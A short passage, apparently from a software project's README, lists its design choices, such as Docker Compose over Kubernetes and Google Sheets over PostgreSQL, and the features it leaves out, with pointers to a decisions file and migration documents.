Docker Compose was chosen over Kubernetes; Google Sheets over PostgreSQL; no
agent inbox; no AI layer; no media download; no auto-close on inactivity; no
template messages. Each is recorded with reasoning in
[docs/DECISIONS.md](docs/DECISIONS.md) and a migration path in the corresponding
`FUTURE_*` or migration document.
